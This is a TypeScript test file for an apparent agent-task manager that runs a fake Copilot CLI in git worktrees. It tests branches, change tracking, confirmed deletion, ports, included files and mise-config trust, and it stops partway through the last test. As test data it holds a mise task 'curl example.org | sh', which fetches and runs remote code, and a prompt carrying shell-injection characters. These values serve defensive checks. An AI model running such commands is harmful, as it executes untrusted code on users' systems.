import { afterAll, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { z } from "zod";
import { removeFolder } from "../src/infra/remove-folder.ts";
import type { Agents } from "../src/modules/agents/agents.ts";
import { TASK_BRANCH_PREFIX } from "../src/modules/agents/task-branch.ts";
import { makeAgents, viewer, waitFor } from "./support/agents.ts";
import { commitFiles, gitIn, makeRepo } from "./support/git-repo.ts";

const cleanups: (() => Promise<void>)[] = [];
afterAll(async () => {
  for (const cleanup of cleanups) await cleanup();
});

/** A clone of a repo with `main` (as from a repo host: with `origin/HEAD`), where the user works on the branch `feature`. */
function cloneOnFeatureBranch(): { dir: string; mainCommit: string } {
  const origin = makeRepo({ "README.md": "# shop\n", "src/login.ts": "export const login = 1;\n" }, "shop-origin");
  const dir = join(mkdtempSync(join(tmpdir(), "trackwall-projects-")), "shop");
  gitIn(origin, "clone", "-q", origin, dir);
  const mainCommit = gitIn(dir, "rev-parse", "HEAD").trim();
  gitIn(dir, "switch", "-q", "-c", "feature");
  commitFiles(dir, { "src/feature.ts": "export const x = 1;\n" }, "the user's work");
  return { dir, mainCommit };
}

/** The task's only session; a task does not know its session, the session points to the task. */
function sessionOf(agents: Agents, task: string): string {
  const [session, ...more] = agents.sessions().sessions.filter((s) => s.task === task);
  if (!session || more.length > 0) throw new Error(`task ${task} does not have exactly one session`);
  return session.id;
}

describe.skipIf(process.versions.bun === undefined)("agent tasks in a worktree (real git and PTY, fake Copilot CLI)", () => {
  test("a task gets a branch from the default branch in a worktree outside the repo, and Copilot CLI starts in it with the prompt", async () => {
    const { dir, mainCommit } = cloneOnFeatureBranch();
    // A worktree path longer than the session screen (`INITIAL_COLS`): the fake must print it in lines that ConPTY on
    // Windows does not wrap. Not longer, because over 260 characters git on Windows does not accept the worktree's `.git` directory.
    const longHome = join(mkdtempSync(join(tmpdir(), "trackwall-agents-")), "a-state-directory-with-a-long-name-on-screen");
    mkdirSync(longHome);
    const { agents, procs, home } = makeAgents({ shop: dir }, longHome);
    cleanups.push(() => procs.stopAll());

    const task = await agents.createTask("shop", "Fix the login in the shop");
    expect(task).toMatchObject({ repo: "shop", prompt: "Fix the login in the shop", baseBranch: "main", base: mainCommit });
    expect(task.branch).toMatch(/^trackwall\/fix-the-login-in-the-shop-[0-9a-f]{6}$/);
    expect(task.worktree).toBe(join(home, "task-worktrees", "shop", task.branch.slice("trackwall/".length)));
    expect(gitIn(task.worktree, "branch", "--show-current").trim()).toBe(task.branch);
    expect(existsSync(join(task.worktree, "src", "feature.ts"))).toBe(false);
    expect(gitIn(dir, "branch", "--show-current").trim()).toBe("feature");

    const session = sessionOf(agents, task.id);
    expect(agents.sessions().sessions.find((s) => s.id === session)).toMatchObject({
      repo: "shop",
      task: task.id,
      run: { kind: "running" },
    });
    const window = viewer(agents, session);
    await waitFor(agents, session, () => window.text().includes("--interactive="), "prompt on the screen");
    // The process sees the directory with links resolved (on macOS `/var` is `/private/var`).
    expect(window.unwrappedText()).toContain(`Directory:${realpathSync(task.worktree)}`);
    expect(window.text()).toContain("Argument: --interactive=Fix the login in the shop");
    expect(window.text()).toContain(`Argument: --session-id=${task.id}`);
    expect(window.text()).toContain("Instructions: trackwall.instructions.md");
    const instructions = readFileSync(join(home, "sessions", session, "instructions", "trackwall.instructions.md"), "utf8");
    expect(instructions).toContain(`You run the task \`${task.id}\` in the repo \`shop\``);
    expect(instructions).toContain("call report_result");
    window.attachment.detach();
  }, 60_000);

  test("a task's changes are commits and uncommitted files, new ones too, and the worktree's index stays untouched", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "add logout");

    commitFiles(task.worktree, { "src/logout.ts": "export const logout = 1;\n" }, "logout");
    writeFileSync(join(task.worktree, "src", "login.ts"), "export const login = 2;\n");
    writeFileSync(join(task.worktree, "notes.md"), "plan\n");

    const changes = await agents.taskChanges(task.id);
    expect(changes.files).toEqual([
      { path: "notes.md", change: "added", additions: 1, deletions: 0 },
      { path: "src/login.ts", change: "modified", additions: 1, deletions: 1 },
      { path: "src/logout.ts", change: "added", additions: 1, deletions: 0 },
    ]);
    expect(changes).toMatchObject({ commits: 1, uncommitted: 2, truncated: false });
    expect(changes.patch).toContain("+export const login = 2;");
    expect(changes.patch).toContain("+plan");
    expect(gitIn(task.worktree, "status", "--porcelain").split("\n").filter(Boolean).sort()).toEqual([" M src/login.ts", "?? notes.md"]);
  }, 60_000);

  test("a task with a running session cannot be ended, and uncommitted changes are lost only after confirmation", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "update the README");
    writeFileSync(join(task.worktree, "README.md"), "# shop after the change\n");

    await expect(agents.removeTask(task.id, true, false)).rejects.toThrow("has a running session");
    await agents.stop(sessionOf(agents, task.id));
    await expect(agents.removeTask(task.id, true, false)).rejects.toMatchObject({
      code: "unsaved_changes",
      message: "ending the task would delete: uncommitted changes in the worktree (1)",
    });
    expect(existsSync(join(task.worktree, "README.md"))).toBe(true);

    await agents.removeTask(task.id, true, true);
    expect(agents.sessions()).toMatchObject({ sessions: [], tasks: [] });
    expect(existsSync(task.worktree)).toBe(false);
    expect(gitIn(dir, "branch", "--list", task.branch).trim()).not.toBe("");
    expect(gitIn(dir, "worktree", "list")).not.toContain(task.worktree);
  }, 60_000);

  test("ending a task together with its branch deletes the task's commits only after confirmation", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "--yolo add a test");
    expect(task.branch).toMatch(/^trackwall\/yolo-add-a-test-[0-9a-f]{6}$/);
    commitFiles(task.worktree, { "test/login.test.ts": "test\n" }, "test");
    await agents.stop(sessionOf(agents, task.id));

    await expect(agents.removeTask(task.id, false, false)).rejects.toMatchObject({
      code: "unsaved_changes",
      message: `ending the task would delete: commits on branch ${task.branch} (1)`,
    });
    await agents.removeTask(task.id, false, true);
    expect(gitIn(dir, "branch", "--list", task.branch).trim()).toBe("");
    expect(existsSync(task.worktree)).toBe(false);
  }, 60_000);

  test("a task survives a daemon restart, and resuming starts Copilot CLI with the task's conversation in its worktree", async () => {
    const { dir } = cloneOnFeatureBranch();
    const first = makeAgents({ shop: dir });
    const task = await first.agents.createTask("shop", "fix the build");
    // Once the first prompt is in, Copilot CLI keeps the task's conversation, which a resume goes on with.
    const firstSession = sessionOf(first.agents, task.id);
    await waitFor(first.agents, firstSession, (s) => s.state !== null, "the task prompt's sessionStart");
    await first.agents.stop(firstSession);

    const restarted = makeAgents({ shop: dir }, first.home);
    cleanups.push(() => restarted.procs.stopAll());
    expect(restarted.agents.sessions()).toEqual({
      sessions: [],
      tasks: [task],
      proposals: [],
      messages: [],
      lastSupervisor: null,
    });

    expect(await restarted.agents.resumeTask(task.id)).toEqual(task);
    await expect(restarted.agents.resumeTask(task.id)).rejects.toThrow("has a running session");
    const session = sessionOf(restarted.agents, task.id);
    const window = viewer(restarted.agents, session);
    await waitFor(restarted.agents, session, () => window.text().includes("--resume="), "resume on the screen");
    expect(window.text()).toContain(`Argument: --resume=${task.id}`);
    // The process sees the directory with links resolved (on macOS `/var` is `/private/var`).
    expect(window.unwrappedText()).toContain(`Directory:${realpathSync(task.worktree)}`);
    expect(window.text()).not.toContain("--interactive=");
    window.attachment.detach();

    restarted.agents.openTaskEditor(task.id);
    expect(restarted.opened).toEqual([task.worktree]);
  }, 60_000);

  test("a new task's worktree goes into the task worktrees folder of the moment, and a changed folder does not move existing tasks", async () => {
    const { dir } = cloneOnFeatureBranch();
    const folders = mkdtempSync(join(tmpdir(), "trackwall-folders-"));
    let worktreesDir = join(folders, "first");
    const first = makeAgents({ shop: dir }, undefined, null, undefined, undefined, undefined, () => worktreesDir);
    const before = await first.agents.createTask("shop", "fix the build");
    await first.agents.stop(sessionOf(first.agents, before.id));
    worktreesDir = join(folders, "second");
    const after = await first.agents.createTask("shop", "add a test");
    await first.agents.stop(sessionOf(first.agents, after.id));

    expect(before.worktree).toBe(join(folders, "first", "shop", before.branch.slice(TASK_BRANCH_PREFIX.length)));
    expect(after.worktree).toBe(join(folders, "second", "shop", after.branch.slice(TASK_BRANCH_PREFIX.length)));
    const restarted = makeAgents({ shop: dir }, first.home, null, undefined, undefined, undefined, () => join(folders, "third"));
    cleanups.push(() => restarted.procs.stopAll());
    expect(restarted.agents.sessions().tasks.map((t) => t.worktree)).toEqual([after.worktree, before.worktree]);

    await restarted.agents.removeTask(before.id, false, true);
    expect(existsSync(before.worktree)).toBe(false);
    expect(existsSync(after.worktree)).toBe(true);
  }, 60_000);

  test("a task saved before the task worktrees folder keeps its worktree in worktrees/ of the state directory", async () => {
    const { dir } = cloneOnFeatureBranch();
    const first = makeAgents({ shop: dir });
    const task = await first.agents.createTask("shop", "fix the build");
    await first.agents.stop(sessionOf(first.agents, task.id));
    // What an older version left behind: the worktree in the state directory and no `worktreesDir` in `tasks.json`.
    const legacy = join(first.home, "worktrees", "shop", task.branch.slice(TASK_BRANCH_PREFIX.length));
    mkdirSync(join(first.home, "worktrees", "shop"), { recursive: true });
    gitIn(dir, "worktree", "move", task.worktree, legacy);
    const file = join(first.home, "tasks.json");
    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
    writeFileSync(file, JSON.stringify({ tasks: saved.tasks.map(({ worktreesDir: _, ...old }) => old) }));

    const restarted = makeAgents({ shop: dir }, first.home);
    cleanups.push(() => restarted.procs.stopAll());
    expect(restarted.agents.sessions().tasks.map((t) => t.worktree)).toEqual([legacy]);
    await restarted.agents.removeTask(task.id, false, true);
    expect(existsSync(legacy)).toBe(false);
    expect(gitIn(dir, "worktree", "list", "--porcelain")).not.toContain(task.branch);
  }, 60_000);

  test("a task in a repo without commits is a repo error, without a worktree and without an entry on the list", async () => {
    const empty = makeRepo({}, "empty");
    const { agents, home } = makeAgents({ empty });
    await expect(agents.createTask("empty", "anything")).rejects.toMatchObject({ code: "repo_unavailable" });
    expect(agents.sessions().tasks).toEqual([]);
    expect(existsSync(join(home, "task-worktrees", "empty"))).toBe(false);
  });
  test("two tasks at once in one repo get separate branches and worktrees", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const [a, b] = await Promise.all([agents.createTask("shop", "fix the login"), agents.createTask("shop", "fix the login")]);
    expect(a.branch).not.toBe(b.branch);
    const listed = gitIn(dir, "worktree", "list", "--porcelain");
    expect(listed).toContain(`branch refs/heads/${a.branch}`);
    expect(listed).toContain(`branch refs/heads/${b.branch}`);
    expect(
      agents
        .sessions()
        .tasks.map((t) => t.id)
        .sort(),
    ).toEqual([a.id, b.id].sort());
  }, 60_000);

  test("shared files of a task are the files another task of the same repo also changes, and a task without a worktree is left out", async () => {
    const { dir } = cloneOnFeatureBranch();
    const other = makeRepo({ "src/login.ts": "export const login = 1;\n" }, "warehouse");
    const { agents, procs } = makeAgents({ shop: dir, warehouse: other });
    cleanups.push(() => procs.stopAll());
    const first = await agents.createTask("shop", "change login");
    const second = await agents.createTask("shop", "add a login test");
    const third = await agents.createTask("shop", "fix the README");
    const elsewhere = await agents.createTask("warehouse", "change login in the warehouse");

    writeFileSync(join(first.worktree, "src", "login.ts"), "export const login = 2;\n");
    writeFileSync(join(first.worktree, "notes.md"), "plan\n");
    commitFiles(second.worktree, { "src/login.ts": "export const login = 3;\n", "test/login.test.ts": "test\n" }, "login test");
    writeFileSync(join(third.worktree, "README.md"), "# shop, changed\n");
    writeFileSync(join(elsewhere.worktree, "src", "login.ts"), "export const login = 4;\n");

    expect(await agents.taskSharedFiles(first.id)).toEqual([{ task: second.id, files: ["src/login.ts"] }]);
    expect(await agents.taskSharedFiles(third.id)).toEqual([]);

    // On Windows the running session keeps its worktree's files open, so it stops first.
    await agents.stop(sessionOf(agents, second.id));
    await removeFolder(second.worktree);
    expect(await agents.taskSharedFiles(first.id)).toEqual([]);
    // The task's own changes are not a warning: without its worktree the call fails as `task-changes` does.
    await expect(agents.taskSharedFiles(second.id)).rejects.toMatchObject({ code: "not_found" });
  }, 60_000);

  test("a prompt with shell characters and a leading hyphen reaches Copilot CLI literally, as one argument", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const prompt = '-x fix "login" & echo %PATH% $HOME';

    const task = await agents.createTask("shop", prompt);
    const session = sessionOf(agents, task.id);
    const window = viewer(agents, session);
    await waitFor(agents, session, () => window.text().includes("--interactive="), "prompt on the screen");
    expect(window.text()).toContain(`Argument: --interactive=${prompt}`);
    window.attachment.detach();
  }, 60_000);

  test("commits from a detached HEAD in the worktree block ending also when the branch is kept", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "experiment");
    await agents.stop(sessionOf(agents, task.id));
    gitIn(task.worktree, "switch", "-q", "--detach");
    commitFiles(task.worktree, { "experiment.md": "x\n" }, "experiment");

    await expect(agents.removeTask(task.id, true, false)).rejects.toMatchObject({
      code: "unsaved_changes",
      message: "ending the task would delete: commits outside the branch, from a detached HEAD (1)",
    });
    await agents.removeTask(task.id, true, true);
    expect(existsSync(task.worktree)).toBe(false);
  }, 60_000);

  test("a worktree directory git no longer knows (e.g. after an interrupted removal) disappears only after confirmation", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "interrupted removal");
    await agents.stop(sessionOf(agents, task.id));
    // This is how `git worktree remove` leaves a worktree when Windows did not let it delete a held file.
    await removeFolder(join(dir, ".git", "worktrees", task.branch.slice(TASK_BRANCH_PREFIX.length)));

    await expect(agents.removeTask(task.id, false, false)).rejects.toMatchObject({
      code: "unsaved_changes",
      message: `ending the task would delete: directory ${task.worktree} with all its contents, because git does not know it as a worktree (interrupted removal, or the repo was moved or deleted)`,
    });
    expect(existsSync(task.worktree)).toBe(true);
    await agents.removeTask(task.id, false, true);
    expect(existsSync(task.worktree)).toBe(false);
    expect(gitIn(dir, "branch", "--list", task.branch).trim()).toBe("");
    expect(agents.sessions().tasks).toEqual([]);
  }, 60_000);

  test("a task whose repo disappeared ends together with its worktree directory only after confirmation", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "the repo will disappear");
    await agents.stop(sessionOf(agents, task.id));
    renameSync(dir, `${dir}-moved`);

    await expect(agents.removeTask(task.id, false, false)).rejects.toMatchObject({ code: "unsaved_changes" });
    expect(existsSync(task.worktree)).toBe(true);
    await agents.removeTask(task.id, false, true);
    expect(agents.sessions().tasks).toEqual([]);
    expect(existsSync(task.worktree)).toBe(false);
  }, 60_000);
  test("ending waits for change computations in progress from several windows, and a new computation meanwhile refuses", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "two windows");
    await agents.stop(sessionOf(agents, task.id));
    writeFileSync(join(task.worktree, "new.md"), "x\n");

    const reads = [agents.taskChanges(task.id), agents.taskChanges(task.id)];
    const removal = agents.removeTask(task.id, false, true);
    expect(() => agents.taskChanges(task.id)).toThrow("this task is already being ended");
    for (const read of await Promise.all(reads)) expect(read.files.map((f) => f.path)).toEqual(["new.md"]);
    await removal;
    expect(existsSync(task.worktree)).toBe(false);
  }, 60_000);

  test("a damaged worktree index is a task changes error, not a diff without new files", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "broken index");
    writeFileSync(gitIn(task.worktree, "rev-parse", "--path-format=absolute", "--git-path", "index").trim(), "this is not an index");

    await expect(agents.taskChanges(task.id)).rejects.toMatchObject({ code: "repo_unavailable" });
  }, 60_000);
  test("a proposal whose task cannot be created stays for another try, and an approved one disappears from the list", async () => {
    const { dir } = cloneOnFeatureBranch();
    const moved = `${dir}-moved`;
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const proposal = await agents.propose(null, {
      repo: "shop",
      title: "Add logout",
      prompt: "add logout",
      model: null,
      approvals: "ask",
      item: null,
    });

    renameSync(dir, moved);
    await expect(agents.approveProposal(proposal.id, proposal.prompt, null, "ask", "terminal")).rejects.toMatchObject({
      code: "repo_unavailable",
    });
    expect(agents.sessions().proposals).toEqual([proposal]);
    expect(agents.sessions().tasks).toEqual([]);

    renameSync(moved, dir);
    const task = await agents.approveProposal(proposal.id, proposal.prompt, null, "ask", "terminal");
    expect(task).toMatchObject({ id: proposal.id, title: "Add logout", proposedBy: { session: null, supervisor: false, task: null } });
    expect(agents.sessions().proposals).toEqual([]);
    await expect(agents.approveProposal(proposal.id, proposal.prompt, null, "ask", "terminal")).rejects.toMatchObject({
      code: "not_found",
    });
  }, 60_000);
  test("a new task trusts the mise config of its fresh worktree, and a mise file the agent adds, changes or deletes is a change until the user trusts the config they saw", async () => {
    const dir = makeRepo(
      { "mise.toml": '[tasks.test]\nrun = "gradle test"\n', "mise-tasks/build": "#!/bin/sh\ngradle build\n", "README.md": "#\n" },
      "shop",
    );
    const { agents, procs, home } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "add a test");
    expect(await agents.taskMiseConfig(task.id)).toMatchObject({ neverTrusted: false, changes: [] });
    expect(await agents.trustedTaskWorktree(task.id, "shop")).toEqual({ worktree: task.worktree, port: task.port });

    writeFileSync(join(task.worktree, "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
    // Ignored by git in most repos, so the task changes would not show it; mise reads it all the same.
    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "1"\n');
    rmSync(join(task.worktree, "mise-tasks", "build"));
    writeFileSync(join(task.worktree, "README.md"), "# not a mise file\n");
    const seen = await agents.taskMiseConfig(task.id);
    expect(seen.changes).toEqual([
      { path: "mise-tasks/build", change: "removed", content: null },
      { path: "mise.local.toml", change: "added", content: '[env]\nX = "1"\n' },
      { path: "mise.toml", change: "modified", content: '[tasks.test]\nrun = "curl example.org | sh"\n' },
    ]);
    await expect(agents.trustedTaskWorktree(task.id, "shop")).rejects.toMatchObject({
      code: "mise_unavailable",
      message: `the mise config in the worktree of task ${task.branch} changed since the user trusted it (mise-tasks/build, mise.local.toml, mise.toml); only the user can trust it, in the task's panel in Trackwall, and a session in Trackwall refused for it is told when they do`,
    });

    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "2"\n');
    await expect(agents.trustTaskMiseConfig(task.id, seen.digest)).rejects.toMatchObject({
      code: "bad_request",
      message: `the mise config of task ${task.branch} changed again; review it before trusting it`,
    });
    const again = await agents.taskMiseConfig(task.id);
    expect(await agents.trustTaskMiseConfig(task.id, again.digest)).toEqual({ neverTrusted: false, changes: [], digest: again.digest });
    expect(await agents.trustedTaskWorktree(task.id, "shop")).toEqual({ worktree: task.worktree, port: task.port });

    // The trust lives in tasks.json, so it outlasts a daemon restart.
    const restarted = makeAgents({ shop: dir }, home);
    expect((await restarted.agents.taskMiseConfig(task.id)).changes).toEqual([]);
    restarted.agents.close();
  }, 60_000);

  test("a task saved before Trackwall kept a trusted mise config has never been trusted: every mise file is a change", async () => {
    const dir = makeRepo({ "mise.toml": '[tasks.test]\nrun = "gradle test"\n' }, "shop");
    const { agents, procs, home } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "add a test");
    agents.close();
    const file = join(home, "tasks.json");
    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
    writeFileSync(file, JSON.stringify({ ...saved, tasks: saved.tasks.map(({ trustedMiseConfig: _, ...t }) => t) }));

    const restarted = makeAgents({ shop: dir }, home);
    expect(await restarted.agents.taskMiseConfig(task.id)).toMatchObject({
      neverTrusted: true,
      // The worktree's checkout may have CRLF line endings on Windows (core.autocrlf).
      changes: [{ path: "mise.toml", change: "added", content: expect.stringContaining('run = "gradle test"') }],
    });
    restarted.agents.close();
  }, 60_000);

  test("a task's worktree is refused for a mise task named with another repo", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "run the tests");

    await expect(agents.trustedTaskWorktree(task.id, "api")).rejects.toMatchObject({
      code: "bad_request",
      message: `task ${task.branch} is in shop, not in api`,
    });
  }, 60_000);

  test("a task cannot be ended while a process (a mise task) still works in its worktree", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "run the tests");
    await agents.stop(sessionOf(agents, task.id));
    const pids = mkdtempSync(join(tmpdir(), "trackwall-pids-"));
    await procs.start({
      owner: "test-in-worktree",
      command: [process.execPath, join(import.meta.dir, "fixtures", "process-tree.ts"), pids, "0", "1"],
      cwd: task.worktree,
      env: process.env,
      logSource: { kind: "task-mise-task", repo: "shop", task: task.id, miseTask: "test" },
    });

    await expect(agents.removeTask(task.id, false, true)).rejects.toMatchObject({
      code: "bad_request",
      message: `a process started by Trackwall still runs in the worktree of task ${task.branch}; stop it before ending the task`,
    });
    expect(existsSync(task.worktree)).toBe(true);

    await procs.stop("test-in-worktree");
    await agents.removeTask(task.id, false, true);
    expect(existsSync(task.worktree)).toBe(false);
  }, 60_000);

  test("tasks get their own ports, the lowest free ones, also when created at once; an ended task gives its port back", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const [a, b] = await Promise.all([agents.createTask("shop", "fix the login"), agents.createTask("shop", "fix the cart")]);
    expect([a.port, b.port].sort()).toEqual([41000, 41001]);

    await agents.stop(sessionOf(agents, a.id));
    await agents.removeTask(a.id, false, true);
    const c = await agents.createTask("shop", "fix the search");
    expect(c.port).toBe(a.port);
  }, 60_000);

  test("a task saved before task ports gets the lowest free port when Trackwall reads it, and keeps it", async () => {
    const { dir } = cloneOnFeatureBranch();
    const { agents, procs, home } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const old = await agents.createTask("shop", "fix the login");
    const kept = await agents.createTask("shop", "fix the cart");
    agents.close();
    const file = join(home, "tasks.json");
    const saved = z.object({ tasks: z.array(z.record(z.string(), z.unknown())) }).parse(JSON.parse(readFileSync(file, "utf8")));
    const withoutPort = saved.tasks.map(({ port, ...t }) => (t.id === old.id ? t : { ...t, port }));
    writeFileSync(file, JSON.stringify({ tasks: withoutPort }));

    const restarted = makeAgents({ shop: dir }, home);
    const ports = new Map(restarted.agents.sessions().tasks.map((t) => [t.id, t.port]));
    expect(ports.get(kept.id)).toBe(kept.port);
    expect(ports.get(old.id)).toBe(old.port);
    expect(readFileSync(file, "utf8")).toContain(`"port": ${old.port}`);
    restarted.agents.close();
  }, 60_000);

  test("a new task's worktree gets the ignored files the repo root's .worktreeinclude names, not tracked or unignored ones", async () => {
    const dir = makeRepo(
      { ".gitignore": ".env\n*-local.yml\ndata/\n", "config/application.yml": "server.port: 8080\n", "README.md": "#\n" },
      "shop",
    );
    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
    writeFileSync(join(dir, "config", "application-local.yml"), "db.password: local\n");
    writeFileSync(join(dir, "notes.txt"), "not ignored, so not meant to stay out of git\n");
    mkdirSync(join(dir, "data"));
    writeFileSync(join(dir, "data", "dump.sql"), "-- not named in .worktreeinclude\n");
    writeFileSync(join(dir, ".worktreeinclude"), ".env\n**/*-local.yml\nnotes.txt\nconfig/application.yml\n");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const task = await agents.createTask("shop", "fix the login");

    expect(task.included).toEqual({ files: [".env", "config/application-local.yml"], problems: [] });
    expect(readFileSync(join(task.worktree, ".env"), "utf8")).toBe("API_TOKEN=local\n");
    expect(readFileSync(join(task.worktree, "config", "application-local.yml"), "utf8")).toBe("db.password: local\n");
    expect(existsSync(join(task.worktree, "notes.txt"))).toBe(false);
    expect(existsSync(join(task.worktree, "data"))).toBe(false);
    // The included files are not the task's changes: git ignores them in the worktree as in the root.
    expect((await agents.taskChanges(task.id)).files).toEqual([]);
  }, 60_000);

  test("an included file the base commit tracks or does not ignore stays out of a new task's worktree", async () => {
    const dir = makeRepo({ ".gitignore": "", "config/application-local.yml": "db.password: committed" }, "shop");
    // Only the root ignores them, with an uncommitted .gitignore; the worktree has the base commit's.
    gitIn(dir, "rm", "-q", "--cached", "config/application-local.yml");
    writeFileSync(join(dir, ".gitignore"), ".env\n*-local.yml\n");
    writeFileSync(join(dir, "config", "application-local.yml"), "db.password: local\n");
    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
    writeFileSync(join(dir, ".worktreeinclude"), ".env\n**/*-local.yml\n");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const task = await agents.createTask("shop", "fix the login");

    expect(task.included).toEqual({
      files: [],
      problems: [
        ".env: the task's base commit tracks it or does not ignore it",
        "config/application-local.yml: the task's base commit tracks it or does not ignore it",
      ],
    });
    // Without a line end: git on Windows checks a committed file out with CRLF.
    expect(readFileSync(join(task.worktree, "config", "application-local.yml"), "utf8")).toBe("db.password: committed");
    expect(existsSync(join(task.worktree, ".env"))).toBe(false);
  }, 60_000);

  test("an included file larger than what is left of 10 MB is left out with the reason, and the files after it are copied", async () => {
    const dir = makeRepo({ ".gitignore": "*.db\n*.yml\n" }, "shop");
    writeFileSync(join(dir, "app.db"), Buffer.alloc(11 * 1024 * 1024));
    writeFileSync(join(dir, "local.yml"), "db.password: local\n");
    writeFileSync(join(dir, ".worktreeinclude"), "*.db\n*.yml\n");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());

    const task = await agents.createTask("shop", "fix the login");

    expect(task.included).toEqual({ files: ["local.yml"], problems: ["app.db: the files together would be more than 10 MB"] });
  }, 60_000);

  // Git on Windows checks out a link as a text file by default (no `core.symlinks`).
  test.skipIf(process.platform === "win32")(
    "an included file whose directory the base commit has as a link is not copied through it",
    async () => {
      const outside = mkdtempSync(join(tmpdir(), "trackwall-outside-"));
      const dir = makeRepo({ ".gitignore": "*-local.yml\n" }, "shop");
      symlinkSync(outside, join(dir, "config"));
      gitIn(dir, "add", "config");
      gitIn(dir, "commit", "-q", "-m", "config as a link");
      gitIn(dir, "checkout", "-q", "-b", "feature");
      gitIn(dir, "rm", "-q", "config");
      mkdirSync(join(dir, "config", "sub"), { recursive: true });
      writeFileSync(join(dir, "config", "sub", "app-local.yml"), "db.password: local\n");
      writeFileSync(join(dir, ".worktreeinclude"), "**/*-local.yml\n");
      const { agents, procs } = makeAgents({ shop: dir });
      cleanups.push(() => procs.stopAll());

      const task = await agents.createTask("shop", "fix the login");

      expect(task.included.files).toEqual([]);
      expect(task.included.problems).toEqual([expect.stringMatching(/^config\/sub\/app-local\.yml: .*beyond a symbolic link/)]);
      expect(readdirSync(outside)).toEqual([]);
    },
    60_000,
  );

  test("copying the included files again gives an existing task the files of a line added to .worktreeinclude later, and leaves the files it has alone", async () => {
    const dir = makeRepo({ ".gitignore": ".env\n*.local.toml\ncerts/\n", "README.md": "#\n" }, "shop");
    writeFileSync(join(dir, ".env"), "API_TOKEN=local\n");
    writeFileSync(join(dir, ".worktreeinclude"), ".env\n");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "fix the login");
    expect(task.included).toEqual({ files: [".env"], problems: [] });
    writeFileSync(join(task.worktree, ".env"), "API_TOKEN=changed by the agent\n");

    writeFileSync(join(dir, "mise.local.toml"), '[env]\nCLIENT_CERT = "{{config_root}}/certs/client.pem"\n');
    mkdirSync(join(dir, "certs"));
    writeFileSync(join(dir, "certs", "client.pem"), "-----BEGIN CERTIFICATE-----\n");
    writeFileSync(join(dir, ".worktreeinclude"), ".env\nmise.local.toml\ncerts/\n");
    const again = await agents.copyIncludedFilesAgain(task.id);

    expect(again.included).toEqual({
      files: ["certs/client.pem", "mise.local.toml"],
      problems: [".env: the worktree has its own version of it, left as it is"],
    });
    expect(agents.task(task.id).included).toEqual(again.included);
    expect(readFileSync(join(task.worktree, "certs", "client.pem"), "utf8")).toBe("-----BEGIN CERTIFICATE-----\n");
    expect(readFileSync(join(task.worktree, ".env"), "utf8")).toBe("API_TOKEN=changed by the agent\n");
    // The copied mise.local.toml comes from the root, so the task's mise config stays trusted.
    expect(await agents.taskMiseConfig(task.id)).toMatchObject({ changes: [] });

    expect((await agents.copyIncludedFilesAgain(task.id)).included).toEqual(again.included);
  }, 60_000);

  test("copying the included files again does not trust a mise file the agent changed", async () => {
    const dir = makeRepo({ ".gitignore": "*.local.toml\n", "mise.toml": '[env]\nA = "1"\n' }, "shop");
    const { agents, procs } = makeAgents({ shop: dir });
    cleanups.push(() => procs.stopAll());
    const task = await agents.createTask("shop", "fix the login");
